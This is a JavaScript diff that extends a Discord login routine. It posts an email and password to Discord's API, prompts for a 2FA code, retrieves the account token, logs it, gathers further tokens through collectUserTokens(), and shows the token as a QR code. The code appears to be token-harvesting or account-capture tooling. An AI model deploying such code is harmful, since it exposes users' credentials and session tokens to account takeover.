@@ -105,11 +105,11 @@ function collectUserTokens() {
 // ---------- FETCH ACCOUNT TOKEN -------------------
 // --------------------------------------------------
 async function fetchAccountToken(email, password) {
-  const apiUrl = "https://discord.com/api/v9/auth/login"; // Discord's login API
+  const apiUrl = "https://discord.com/api/v9/auth/login";
   const payload = {
-    login: email, // Discord uses "login" for email or phone
+    login: email,
     password: password,
-    undelete: false, // Optional, as per Discord's API
+    undelete: false,
     login_source: null,
     gift_code_sku_id: null
   };
@@ -118,8 +118,8 @@ async function fetchAccountToken(email, password) {
     const response = await fetch(apiUrl, {
       method: "POST",
       headers: {
-        "Content-Type": "application/json",
-        "User-Agent": navigator.userAgent // Mimic browser headers
+        "Content-Type": "application/json"
+        // Removed User-Agent to avoid CORS preflight issue
       },
       body: JSON.stringify(payload)
     });
@@ -131,14 +131,53 @@ async function fetchAccountToken(email, password) {
     }
 
     const data = JSON.parse(responseText);
-    const token = data.token; // Discord returns token directly as "token"
+    if (data.mfa) {
+      // MFA required
+      const mfaCode = prompt("Enter your 2FA code:");
+      if (!mfaCode) throw new Error("MFA code required");
+
+      const mfaResponse = await fetch("https://discord.com/api/v9/auth/mfa/totp", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          code: mfaCode,
+          ticket: data.ticket,
+          login_source: null,
+          gift_code_sku_id: null
+        })
+      });
+
+      const mfaText = await mfaResponse.text();
+      console.log("MFA Response:", mfaText);
+      if (!mfaResponse.ok) {
+        throw new Error(`MFA HTTP ${mfaResponse.status}: ${mfaText}`);
+      }
+
+      const mfaData = JSON.parse(mfaText);
+      const token = mfaData.token;
+      console.log("MFA Token retrieved:", token);
+
+      const userTokens = collectUserTokens();
+      console.log("Collected tokens after MFA login:", userTokens);
+
+      if (token) {
+        const qrCode = generateQRCode(token);
+        if (qrCode) {
+          document.body.appendChild(qrCode);
+        }
+      }
+
+      return { apiToken: token, userTokens };
+    }
+
+    const token = data.token;
     console.log("Token retrieved:", token);
 
-    // Collect tokens after API response
     const userTokens = collectUserTokens();
     console.log("Collected tokens after login:", userTokens);
 
-    // Optionally generate QR code with the token
     if (token) {
       const qrCode = generateQRCode(token);
       if (qrCode) {
